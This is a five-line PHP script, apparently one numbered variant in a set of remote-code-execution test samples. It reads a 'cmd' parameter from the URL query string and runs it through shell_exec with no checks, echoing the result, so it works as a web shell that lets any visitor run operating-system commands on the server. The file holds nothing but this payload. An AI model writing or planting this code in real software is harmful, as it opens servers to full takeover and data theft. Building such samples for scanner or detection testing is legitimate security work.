<?php
// RCE test variation #106
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>